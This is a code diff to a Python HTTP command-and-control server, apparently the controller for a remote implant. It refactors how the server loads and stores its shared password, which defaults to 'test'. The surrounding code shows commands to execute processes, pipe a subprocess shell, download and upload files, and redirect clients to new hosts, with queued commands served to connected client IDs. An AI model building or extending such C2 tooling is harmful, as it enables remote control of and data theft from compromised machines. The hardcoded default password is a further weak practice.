@@ -8,15 +8,23 @@ SECURITY_PASSWORD_FILE = "security_password.txt"
 HOST_CONFIG_FILE = "host_config.txt"
 
 def load_security_password():
+    global SECURITY_PASSWORD_GLOBAL
+    if SECURITY_PASSWORD_GLOBAL is not None:
+        return SECURITY_PASSWORD_GLOBAL 
+
     if os.path.exists(SECURITY_PASSWORD_FILE):
         with open(SECURITY_PASSWORD_FILE, "r", encoding="utf-8") as f:
-            return f.read().strip()
-    pw = "test"
-    with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:
-        f.write(pw)
-    return pw
+            SECURITY_PASSWORD_GLOBAL = f.read().strip()
+    else:
+        SECURITY_PASSWORD_GLOBAL = "test"  # Default password
+        with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:
+            f.write(SECURITY_PASSWORD_GLOBAL)
+    
+    return SECURITY_PASSWORD_GLOBAL
 
 def store_security_password(new_password):
+    global SECURITY_PASSWORD_GLOBAL
+    SECURITY_PASSWORD_GLOBAL = new_password  # Update the global variable
     with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:
         f.write(new_password)
 
@@ -30,7 +38,8 @@ def store_host_config(ip_port_str):
     with open(HOST_CONFIG_FILE, "w", encoding="utf-8") as f:
         f.write(ip_port_str)
 
-SECURITY_PASSWORD = load_security_password()
+SECURITY_PASSWORD_GLOBAL = None
+SECURITY_PASSWORD_GLOBAL = load_security_password()
 command_queue = queue.Queue()
 connected_guids = {}
 fileFrom = {}
@@ -42,7 +51,7 @@ COMMANDS = {
     0x00: "Authentication", 0x01: "Execute process", 0x02: "Execute w/ output", 0x03: "Download file",
     0x04: "Upload file",    0x05: "Create Subprocess",0x06: "Close Subprocess",0x07: "Subprocess pipe in/out",
     0x08: "Set TimeLong",   0x09: "Set TimeShort",    0x0A: "Set new Security password", 0x0B: "Set Host(s)"
-}
+} # Fist c2 path then client path: 4 C:\host_path\c2.py C:\client_path\c2.py
 
 def log_to_file(message, filename="c2_server.log"):
     with open(filename, "a", encoding="utf-8") as lf:
@@ -103,7 +112,7 @@ class C2Handler(BaseHTTPRequestHandler):
             return
         if not connected_guids[guid]:
             auth_cmd = 0x00
-            payload = SECURITY_PASSWORD.encode("utf-16-le") + b"\x00\x00"
+            payload = SECURITY_PASSWORD_GLOBAL.encode("utf-16-le") + b"\x00\x00"
             self.send_get_response(bytes([auth_cmd]) + payload)
             return
         item = command_queue.get()
